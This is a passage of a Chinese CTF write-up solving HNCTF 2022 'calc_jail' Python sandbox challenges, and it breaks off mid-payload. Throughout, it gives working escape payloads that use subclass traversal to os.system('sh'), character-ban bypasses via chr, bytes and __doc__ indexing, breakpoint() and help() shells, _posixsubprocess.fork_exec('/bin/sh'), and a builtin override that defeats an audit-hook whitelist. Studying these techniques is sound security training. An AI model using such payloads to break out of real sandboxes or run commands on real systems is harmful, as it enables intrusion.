<code>__mro__</code>是以元组的形式返回与该对象所属类相关的所有类 <code>__bases__</code>是以元组的形式返回这个对象</p><p>所属类的父类</p><p><code>__subclasses__()</code> <font color='red'>别丢括号</font>这个函数会返回当前吗父类下的所有子类 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731163859985.png" alt="image-20230731163859985"></p><p>因此我们可以利用这个函数 查看object类的所有子类 从中找到我们可以利用的类来进行rce(远程命令执行) 当我们想使用具体的类的时候 加上查询结果中对应的下标索引就好</p><p>但是在这题中字母<code>b</code>是被ban掉的 因此我们可以使用getattr()和chr()两个函数来进行拼接和执行函数</p><p>学习一下getsttr()函数：</p><p>描述：</p><p>getsttr()用于返回一个对象属性值</p><p>参数：</p><pre><code>getattr(object, name[, default])</code></pre><p>参数：</p><ul><li>object – 对象。</li><li>name – 字符串，对象属性。</li><li>default – 默认返回值，如果不提供该参数，在没有对应属性时，将触发 AttributeError。</li></ul><p>我们可以使用chr(hex)替换掉被ban掉的字母 这样就可以组成我们需要的函数 getattr()函数可以帮助我们实现运行使用chr()替换的函数</p><p>下面是对于<code>().__class__.__base__.__subclasses__()</code> 使用chr()和getattr()函数的渐变过程</p><p>注意在转化的时候 单引号需要进行省略</p><pre><code>getattr(().__class__, &#39;__base__&#39;).__subclasses__()getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)).__subclasses__()getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)), &#39;__subclasses__&#39;)()getattr(getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)), chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()</code></pre><p>我们尝试在题目环境中输入这段命令 查看返回的object父类中包含的所有子类</p><pre><code>Answer: [&lt;class &#39;type&#39;&gt;, &lt;class &#39;async_generator&#39;&gt;, &lt;class &#39;int&#39;&gt;, &lt;class &#39;bytearray_iterator&#39;&gt;, &lt;class &#39;bytearray&#39;&gt;, &lt;class &#39;bytes_iterator&#39;&gt;, &lt;class &#39;bytes&#39;&gt;, &lt;class &#39;builtin_function_or_method&#39;&gt;, &lt;class &#39;callable_iterator&#39;&gt;, &lt;class &#39;PyCapsule&#39;&gt;, &lt;class &#39;cell&#39;&gt;, &lt;class &#39;classmethod_descriptor&#39;&gt;, &lt;class &#39;classmethod&#39;&gt;, &lt;class &#39;code&#39;&gt;, &lt;class &#39;complex&#39;&gt;, &lt;class &#39;coroutine&#39;&gt;, &lt;class &#39;dict_items&#39;&gt;, &lt;class &#39;dict_itemiterator&#39;&gt;, &lt;class &#39;dict_keyiterator&#39;&gt;, &lt;class &#39;dict_valueiterator&#39;&gt;, &lt;class &#39;dict_keys&#39;&gt;, &lt;class &#39;mappingproxy&#39;&gt;, &lt;class &#39;dict_reverseitemiterator&#39;&gt;, &lt;class &#39;dict_reversekeyiterator&#39;&gt;, &lt;class &#39;dict_reversevalueiterator&#39;&gt;, &lt;class &#39;dict_values&#39;&gt;, &lt;class &#39;dict&#39;&gt;, &lt;class &#39;ellipsis&#39;&gt;, &lt;class &#39;enumerate&#39;&gt;, &lt;class &#39;float&#39;&gt;, &lt;class &#39;frame&#39;&gt;, &lt;class &#39;frozenset&#39;&gt;, &lt;class &#39;function&#39;&gt;, &lt;class &#39;generator&#39;&gt;, &lt;class &#39;getset_descriptor&#39;&gt;, &lt;class &#39;instancemethod&#39;&gt;, &lt;class &#39;list_iterator&#39;&gt;, &lt;class &#39;list_reverseiterator&#39;&gt;, &lt;class &#39;list&#39;&gt;, &lt;class &#39;longrange_iterator&#39;&gt;, &lt;class &#39;member_descriptor&#39;&gt;, &lt;class &#39;memoryview&#39;&gt;, &lt;class &#39;method_descriptor&#39;&gt;, &lt;class &#39;method&#39;&gt;, &lt;class &#39;moduledef&#39;&gt;, &lt;class &#39;module&#39;&gt;, &lt;class &#39;odict_iterator&#39;&gt;, &lt;class &#39;pickle.PickleBuffer&#39;&gt;, &lt;class &#39;property&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;range&#39;&gt;, &lt;class &#39;reversed&#39;&gt;, &lt;class &#39;symtable entry&#39;&gt;, &lt;class &#39;iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;set&#39;&gt;, &lt;class &#39;slice&#39;&gt;, &lt;class &#39;staticmethod&#39;&gt;, &lt;class &#39;stderrprinter&#39;&gt;, &lt;class &#39;super&#39;&gt;, &lt;class &#39;traceback&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;tuple&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;str&#39;&gt;, &lt;class &#39;wrapper_descriptor&#39;&gt;, &lt;class &#39;types.GenericAlias&#39;&gt;, &lt;class &#39;anext_awaitable&#39;&gt;, &lt;class &#39;async_generator_asend&#39;&gt;, &lt;class &#39;async_generator_athrow&#39;&gt;, &lt;class &#39;async_generator_wrapped_value&#39;&gt;, &lt;class &#39;coroutine_wrapper&#39;&gt;, &lt;class &#39;InterpreterID&#39;&gt;, &lt;class &#39;managedbuffer&#39;&gt;, &lt;class &#39;method-wrapper&#39;&gt;, &lt;class &#39;types.SimpleNamespace&#39;&gt;, &lt;class &#39;NoneType&#39;&gt;, &lt;class &#39;NotImplementedType&#39;&gt;, &lt;class &#39;weakref.CallableProxyType&#39;&gt;, &lt;class &#39;weakref.ProxyType&#39;&gt;, &lt;class &#39;weakref.ReferenceType&#39;&gt;, &lt;class &#39;types.UnionType&#39;&gt;, &lt;class &#39;EncodingMap&#39;&gt;, &lt;class &#39;fieldnameiterator&#39;&gt;, &lt;class &#39;formatteriterator&#39;&gt;, &lt;class &#39;BaseException&#39;&gt;, &lt;class &#39;hamt&#39;&gt;, &lt;class &#39;hamt_array_node&#39;&gt;, &lt;class &#39;hamt_bitmap_node&#39;&gt;, &lt;class &#39;hamt_collision_node&#39;&gt;, &lt;class &#39;keys&#39;&gt;, &lt;class &#39;values&#39;&gt;, &lt;class &#39;items&#39;&gt;, &lt;class &#39;_contextvars.Context&#39;&gt;, &lt;class &#39;_contextvars.ContextVar&#39;&gt;, &lt;class &#39;_contextvars.Token&#39;&gt;, &lt;class &#39;Token.MISSING&#39;&gt;, &lt;class &#39;filter&#39;&gt;, &lt;class &#39;map&#39;&gt;, &lt;class &#39;zip&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&gt;, &lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&gt;, &lt;class &#39;_frozen_importlib.ModuleSpec&#39;&gt;, &lt;class &#39;_frozen_importlib.BuiltinImporter&#39;&gt;, &lt;class &#39;_frozen_importlib.FrozenImporter&#39;&gt;, &lt;class &#39;_frozen_importlib._ImportLockContext&#39;&gt;, &lt;class &#39;_thread.lock&#39;&gt;, &lt;class &#39;_thread.RLock&#39;&gt;, &lt;class &#39;_thread._localdummy&#39;&gt;, &lt;class &#39;_thread._local&#39;&gt;, &lt;class &#39;_io._IOBase&#39;&gt;, &lt;class &#39;_io._BytesIOBuffer&#39;&gt;, &lt;class &#39;_io.IncrementalNewlineDecoder&#39;&gt;, &lt;class &#39;posix.ScandirIterator&#39;&gt;, &lt;class &#39;posix.DirEntry&#39;&gt;, &lt;class &#39;_frozen_importlib_external.WindowsRegistryFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external._LoaderBasics&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespacePath&#39;&gt;, &lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;, &lt;class &#39;_frozen_importlib_external.PathFinder&#39;&gt;, &lt;class &#39;_frozen_importlib_external.FileFinder&#39;&gt;, &lt;class &#39;codecs.Codec&#39;&gt;, &lt;class &#39;codecs.IncrementalEncoder&#39;&gt;, &lt;class &#39;codecs.IncrementalDecoder&#39;&gt;, &lt;class &#39;codecs.StreamReaderWriter&#39;&gt;, &lt;class &#39;codecs.StreamRecoder&#39;&gt;, &lt;class &#39;_abc._abc_data&#39;&gt;, &lt;class &#39;abc.ABC&#39;&gt;, &lt;class &#39;collections.abc.Hashable&#39;&gt;, &lt;class &#39;collections.abc.Awaitable&#39;&gt;, &lt;class &#39;collections.abc.AsyncIterable&#39;&gt;, &lt;class &#39;collections.abc.Iterable&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;]</code></pre><p>在下标索引为<code>-4</code>的位置看到了<code>&lt;class &#39;os._wrap_close&#39;&gt;</code> 可以构造payload</p><pre><code class="python">().__class__.__base__.__subclasses__()[-4].__init__.__global__[&#39;sysytem&#39;](&#39;sh&#39;)</code></pre><p>整体转换一下</p><pre><code>getattr(getattr(getattr(getattr(().__class__, chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)), chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4], chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)), chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104))</code></pre><p>进入sh交互模式 找到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731172455253.png" alt="image-20230731172455253"></p><p><strong>NSSCTF{aeb2432a-8fdd-4c36-81d6-8a60bf3d8212}</strong></p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p><code>__builtins__</code>模块用于查看python内部的内置变量和内置函数</p><p><code>__builtins__</code>是对<code>builtins</code>的引用 在任何地方使用<code>builtins</code>都必须import 但是使用<code>__builtins__</code>不需要使用import </p><p>写出payload</p><pre><code class="python">__builtins__.__import__(&#39;os&#39;).system(&#39;cat flag&#39;)</code></pre><p>调用了os模块的system函数(用于在操作系统的 shell 中执行命令。它接收一个字符串参数 <code>command</code>，表示要执行的系统命令，然后将该命令传递给操作系统的 shell 进行执行) 执行<code>cat flag</code>命令 直接读取flag文件的值</p><p>在这之前还要通过input()函数 输入上述payload 因为环境ban掉了字母<code>i</code> 因此我们还是使用chr()函数 替换掉input()函数</p><pre><code class="python">eval(chr(0x65)+chr(0x78)+chr(0x65)+chr(0x63)+chr(0x28)+chr(0x69)+chr(0x6e)+chr(0x70)+chr(0x75)+chr(0x74)+chr(0x28)+chr(0x29)+chr(0x29))# eval(exec(input()))&#39;&#39;&#39;exec()的作用动态执行代码：exec() 允许在程序运行时根据需要执行动态生成的 Python 代码。这对于动态创建函数、类、变量等非常有用。动态导入模块：使用 exec() 可以实现在运行时动态导入模块，而不是在代码中固定导入。执行用户输入的代码：exec() 可以用于执行用户输入的 Python 代码，允许在程序运行时根据用户的输入执行相应的操作。脚本执行：有时候，你可能希望从文件或网络获取一段 Python 代码，并在程序中执行它。exec() 允许你动态地执行从外部来源获取的代码。&#39;&#39;&#39;</code></pre><p>当然这个payload的前提是 知道flag文件的位置和名字 </p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>同样 在知道flag的位置和名字的时候 我们可以直接open并read到flag</p><pre><code>open(chr(102)+chr(108)+chr(97)+chr(103)).read()# open(&#39;flag&#39;).read()</code></pre><h2 id="HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL-参数逃逸"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL-参数逃逸" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL 参数逃逸)"></a>[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL 参数逃逸)</h2><p>这一关是限制了输入命令的长度为13个字符 13个字符 正好<code>eval(input())</code></p><p>这样我们在想输入什么命令就没有限制了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731201557462.png" alt="image-20230731201557462"></p><p><strong>NSSCTF{c6bdf2aa-f85f-49cf-ac71-b892ad007a47}</strong></p><h2 id="HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL-breakpoint"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL-breakpoint" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL breakpoint())"></a>[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL breakpoint())</h2><p>这次是直接限制了<code>exec eval input</code>  同时payload的长度限制在了13位</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731202239224.png" alt="image-20230731202239224"></p><p>这里使用一个叫做breakpoint()的函数  可以进入一个Pdb交互界面</p><pre><code>pdb 模块定义了一个交互式源代码调试器，用于Python 程序。 它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意Python 代码。 它还支持事后调试，可以在程序控制下调用。 调试器是可扩展的——调试器实际被定义为 Pdb 类。</code></pre><p> 之后在输入<code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code>就可以进入shell了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731203228696.png" alt="image-20230731203228696"></p><p>得到flag：<strong>NSSCTF{69432ccf-eb26-4236-a1f0-a78b02a8ae71}</strong></p><h2 id="HNCTF-2022-Week1-calc-jail-beginner-level3-JAIL-help"><a href="#HNCTF-2022-Week1-calc-jail-beginner-level3-JAIL-help" class="headerlink" title="[HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL help())"></a>[HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL help())</h2><p>这关相比level2 限制的字数更少 payload不能超过7个字符</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731204432274.png" alt="image-20230731204432274"></p><p>这边是使用help()函数进行rce</p><p>输入help()之后也会进入一个交互界面 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731213412627.png" alt="image-20230731213412627"></p><p>按照上面提到的方式 先输入<code>modules</code> 查看所有的模块 随便选一个输入  比如看到的<code>os</code></p><pre><code>modulesos!ls!cat flag</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731213810206.png" alt="image-20230731213810206"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731213823579.png" alt="image-20230731213823579"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731214138100.png" alt="image-20230731214138100"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731214206969.png" alt="image-20230731214206969"></p><p><strong>NSSCTF{4e28ebac-4a64-4205-8853-b49286703415}</strong></p><h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-JAIL、bytes-decode-、-doc"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-JAIL、bytes-decode-、-doc" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL、bytes([]).decode() 、__doc__)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL、bytes([]).decode() 、<code>__doc__</code>)</h2><p>查看源码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230801201356423.png" alt="image-20230801201356423"></p><p>将<code>&#39;__loader__&#39;, &#39;__import__&#39;, &#39;compile&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;chr&#39;</code>等函数都ban掉了 后面又将单引号、双引号、反斜杠、反引号给ban了</p><p>因为ban掉了<code>__import__</code>之前提到的help()和breakpoint()都没有办法使用 但是并没有ban掉其余的字母</p><h3 id="方法一：-1"><a href="#方法一：-1" class="headerlink" title="方法一："></a>方法一：</h3><p>尝试使用之前的SSTI注入 先查询object类下的子类  查看可以使用的模块</p><pre><code>().__class__.__base__.__subclasses__()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230801223643348.png" alt="image-20230801223643348"></p><p>并没有过滤模块 os模块还可以使用 虽然禁用了<code>chr()</code>函数 但是bytes()函数也可以构造字符串 下面是转化过程：</p><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[&#39;system&#39;](&#39;sh&#39;)转化为().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115,121,115,116,101,109]).decode()](bytes([115,104]).decode())</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230801225100070.png" alt="image-20230801225100070"></p><h3 id="方法二：-1"><a href="#方法二：-1" class="headerlink" title="方法二："></a>方法二：</h3><p>同样是使用bytes()函数 猜测flag文件的位置和名字 可以直接对 <code>open(&#39;flag&#39;).read()</code>进行转化  直接读取flag</p><pre><code>open(bytes([102,108,97,103]).decode()).read()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230801225252004.png" alt="image-20230801225252004"></p><h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>像一些默认类，如：str、dict、list等，都会有相应的文档。这时可以直接从<code>__doc__</code>里面去找，用索引的方式获得想要的字符，并拼接再一起，得到想要的字符串。</p><p>在这里 我们使用列表这个类来查找字符</p><pre><code class="python">print([].__doc__)&#39;&#39;&#39;输出：Built-in mutable sequence.If no argument is given, the constructor creates a new empty list.The argument must be an iterable if specified.&#39;&#39;&#39;</code></pre><p>使用find命令查找字符下标</p><pre><code class="python">print([].__doc__.find(&#39;s&#39;))&#39;&#39;&#39;输出：17&#39;&#39;&#39;</code></pre><p>那么可以使用下标进行拼接system和sh函数</p><pre><code class="python"># system[].__doc__[17]+[].__doc__[87]+[].__doc__[17]+[].__doc__[4]+[].__doc__[15]+[].__doc__[9]# sh[].__doc__[17]+[].__doc__[54]</code></pre><p>下面是转换过程</p><pre><code class="python">().__class__.__base__.subclasses__()[-4].__init__.__globals__[&#39;system&#39;].(&#39;sh&#39;)().__class__.__base__.__subclasses__()[-4].__init__.__globals__[[].__doc__[17]+[].__doc__[87]+[].__doc__[17]+[].__doc__[4]+[].__doc__[15]+[].__doc__[9]]([].__doc__[17]+[].__doc__[54])</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230801231059013.png" alt="image-20230801231059013"></p><h3 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-0-5-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-0-5-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.0.5(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.0.5(JAIL)</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230804204635253.png" alt="image-20230804204635253"></p><p>在题干处给出ban掉了<code>__loader__,__import__,compile,eval,exec,chr,input,locals,globals and </code>,”,’ &#96;</p><p>同level4 三种方法任选其一即可</p><p><strong>NSSCTF{58d8ebf7-2162-4bdb-a2a6-98515e0871bc}</strong></p><h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-1-JAIL-下标索引-bytes"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-1-JAIL-下标索引-bytes" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL 下标索引 bytes())"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL 下标索引 bytes())</h2><p>在题干处给出提示 ban掉了<code>__loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and</code>,”,’&#96;</p><p>与上两题不同 这次将<code>bytes</code>也ban掉了 第二种和第一种方法就没法使用了</p><p>但是第三种方法还是可以使用的  </p><p>这里仿照第一种方法的形式 先查看object下的所有子类 发现<code>bytes</code>的下标索引是6  因此可以进行利用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230804220530811.png" alt="image-20230804220530811"></p><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115,121,115,116,101,109]).decode()](bytes([115,104]).decode())转化为().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115,121,115,116,101,109]).decode()](().__class__.__base__.__subclasses__()[6]([115,104]).decode())</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230804221050269.png" alt="image-20230804221050269"></p><p><strong>NSSCTF{006582c3-2430-49d8-9cee-b631c7aed4dc}</strong></p><h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-2-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-2-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.2(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.2(JAIL)</h2><p>同level4.1 </p><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115,121,115,116,101,109]).decode()](().__class__.__base__.__subclasses__()[6]([115,104]).decode())</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230804225030885.png" alt="image-20230804225030885"></p><p><strong>NSSCTF{ab748a53-bafc-41cb-bb20-b22b025fdb8e}</strong></p><h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-3-JAIL-str-join拼接字符"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-3-JAIL-str-join拼接字符" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL str().join拼接字符)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL str().join拼接字符)</h2><p>这里看题干知道 除了ban掉上一题的内容还ban掉了<code>+</code>  其实使用上一题的payload是完全没问题的</p><p>禁用<code>+</code> 但是我们还可以使用<code>john()</code>函数进行拼接 </p><pre><code>&#39;&#39;.join([&#39;s&#39;, &#39;y&#39;, &#39;s&#39;, &#39;t&#39;, &#39;e&#39;, &#39;m&#39;])</code></pre><p>这样就能得到system 但是双引号也被ban掉了 我们可以使用<code>str()</code>这个函数 就相当于一个双引号 </p><pre><code>str().join([&#39;s&#39;, &#39;y&#39;, &#39;s&#39;, &#39;t&#39;, &#39;e&#39;, &#39;m&#39;])</code></pre><p>由此可以得到payload</p><pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[[].__doc__[17]+[].__doc__[87]+[].__doc__[17]+[].__doc__[4]+[].__doc__[15]+[].__doc__[9]]([].__doc__[17]+[].__doc__[54])().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([[].__doc__[17],[].__doc__[87],[].__doc__[17],[].__doc__[4],[].__doc__[15],[].__doc__[9]])](str().join([[].__doc__[17],[].__doc__[54]]))</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805221344148.png" alt="image-20230805221344148"></p><p><strong>NSSCTF{b13441a1-e6e1-4ab0-968c-f80170f5925f}</strong></p><h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level5-dir"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-dir" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level5(dir())"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level5(dir())</h2><p>并没有ban掉什么内容  提示flag在dir()里面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805131907416.png" alt="image-20230805131907416"></p><p>其实直接使用最开始的SSTI注入 就可以直接进入交互模式</p><pre><code>().__class__.__base__.__subclasses__()[-6].__init__.__globals__[&#39;system&#39;](&#39;sh&#39;)</code></pre><p>或者直接进行rce</p><pre><code>__import__(&#39;os&#39;).system(&#39;cat flag&#39;)</code></pre><p>但是这里我们选择使用dir()来解决题目</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805134401775.png" alt="image-20230805134401775"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805134321794.png" alt="image-20230805134321794"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805134347519.png" alt="image-20230805134347519"></p><p>发现<code>encode</code>函数可以使用</p><pre><code>my_flag.flag_level5.encode()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805135450313.png" alt="image-20230805135450313"></p><p>来看一下源码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805140540826.png" alt="image-20230805140540826"></p><h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level5-1"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-1" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1</h2><p>同level5 只是这次有了一些黑名单的过滤</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805135908651.png" alt="image-20230805135908651"></p><p>可以使用SSTI注入进入交互模式 也可以直接使用dir()拿到flag</p><p><strong>NSSCTF{6e6ce512-08e0-4792-9d14-cb41370382b2}</strong></p><h2 id="HNCTF-2022-WEEK3-calc-jail-beginner-level6-JAIL-posixsubprocess-fork-exec-lamba表达式"><a href="#HNCTF-2022-WEEK3-calc-jail-beginner-level6-JAIL-posixsubprocess-fork-exec-lamba表达式" class="headerlink" title="[HNCTF 2022 WEEK3]calc_jail_beginner_level6(JAIL _posixsubprocess.fork_exec lamba表达式)"></a>[HNCTF 2022 WEEK3]calc_jail_beginner_level6(JAIL _posixsubprocess.fork_exec lamba表达式)</h2><p>这次是给出了白名单 只有在白名单中的函数才可以使用 <code>builtins.input,builtins.input/result,exec,compile</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805171210883.png" alt="image-20230805171210883"></p><h3 id="方法一：-2"><a href="#方法一：-2" class="headerlink" title="方法一："></a>方法一：</h3><p>这里需要使用<code>_posixsubprocess.fork_exec</code></p><p>首先将<code>_posixsubprocess</code>类导进去 <code>import</code>使用不了 但是<code>__builtins__</code>还是可以使用的</p><pre><code class="python">__builtins__[&#39;__loader__&#39;].load_module(&#39;_posixsubprocess&#39;)或：__loader__.load_module(&#39;_posixsubprocess&#39;)</code></pre><p>下面是完整的payload</p><pre><code>import os__loader__.load_module(&#39;_posixsubprocess&#39;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)</code></pre><p>进入shell界面 读取flag就好(虽然会在shell和python界面来回切换)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805172325862.png" alt="image-20230805172325862"></p><p><strong>NSSCTF{a7586393-169d-4daf-abcf-db107c89c33a}</strong></p><h3 id="方法二：-2"><a href="#方法二：-2" class="headerlink" title="方法二："></a>方法二：</h3><pre><code>exec(&quot;globals()[&#39;__builtins__&#39;][&#39;set&#39;]=lambda x: [&#39;builtins.input&#39;, &#39;builtins.input/result&#39;,&#39;exec&#39;, &#39;compile&#39;, &#39;os.system&#39;]\nimport os\nos.system(&#39;/bin/sh&#39;)&quot;)</code></pre><h2 id="HNCTF-2022-WEEK3-calc-jail-beginner-level6-1-海象运算符、列表、无限迭代器"><a href="#HNCTF-2022-WEEK3-calc-jail-beginner-level6-1-海象运算符、列表、无限迭代器" class="headerlink" title="[HNCTF 2022 WEEK3]calc_jail_beginner_level6.1(海象运算符、列表、无限迭代器)"></a>[HNCTF 2022 WEEK3]calc_jail_beginner_level6.1(海象运算符、列表、无限迭代器)</h2><p>给了部分源码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805200804050.png" alt="image-20230805200804050"></p><p>这次只能进行一次代码执行操作 使用到一个运算符<code>海象运算符</code></p><pre><code>:=海象运算符的优势在于能在不允许赋值的地方（如if语句的条件表达式中）使用赋值变量。海象运算符左侧有个标识符，赋值表达式的值等于分配给这个标识符的值</code></pre><pre><code>[os := __import__(&#39;os&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), _posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)]</code></pre><p>上一步就是实现level6的payload 先导入os模块 再导入<code>_posixsubprocess</code>模块 在使用<code>_posixsubprocess</code>模块</p><p>但是shell只显示一次shell 就退掉了 因此要使用无线迭代器<code>itertools</code></p><pre><code>[os := __import__(&#39;os&#39;), itertools := __loader__.load_module(&#39;itertools&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in 